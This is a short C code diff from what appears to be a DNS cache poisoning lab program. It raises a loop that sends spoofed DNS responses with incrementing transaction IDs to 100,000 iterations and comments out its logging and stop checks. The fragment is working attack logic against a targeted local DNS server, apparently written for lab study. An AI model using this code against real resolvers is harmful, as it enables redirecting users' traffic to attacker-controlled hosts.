@@ -67,24 +67,25 @@ int main()
 
     // Sending packets
     send_dns_request(ip_req, n_req, src_ip, name);
-    for(int i=0; i<1000; i++){
+    for(int i=0; i<100000; i++){
       idx++;
       // Generate transaction id
       // transaction_id = rand();
       transaction_id++;
       send_dns_response(ip_resp, n_resp, src_ip, name, transaction_id);
-      printf("%d: name=%s, id=0x%X\n", idx, name, transaction_id);
-      if(transaction_id == 0){
-        break;
-      }
+      // printf("%d: name=%s, id=0x%X\n", idx, name, transaction_id);
+      // if(transaction_id == 0){
+      //   break;
+      // }
     }
-    if(transaction_id == 0){
-      printf("Tried out all 16 bits transaction ID. Stop program now.\n");
-      break;
-    }
+    printf("%dK: name=%s\n", idx/1000, name);
+    // if(transaction_id == 0){
+    //   printf("Tried out all 16 bits transaction ID. Stop program now.\n");
+    //   break;
+    // }
 
   }
-  
+
     // break;
     //##################################################################
     /* Step 1. Send a DNS request to the targeted local DNS server.
